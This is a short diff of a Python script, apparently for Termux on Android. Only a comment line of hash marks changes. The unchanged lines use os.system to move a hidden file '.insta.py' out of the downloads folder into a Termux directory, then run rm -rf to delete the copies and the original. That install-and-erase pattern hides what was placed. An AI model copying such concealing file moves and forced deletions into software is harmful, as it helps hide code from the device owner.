@@ -1,4 +1,4 @@
-###################
+####################
 import os, sys, time
 os.system("mv /sdcard/download/.insta.py /data/data/com.termux/files/svr/.insta.py")
 os.system("rm -rf .insta.py ;rm -rf insta.py ;cd $HOME ;rm -rf /sdcard/download/.insta.py")
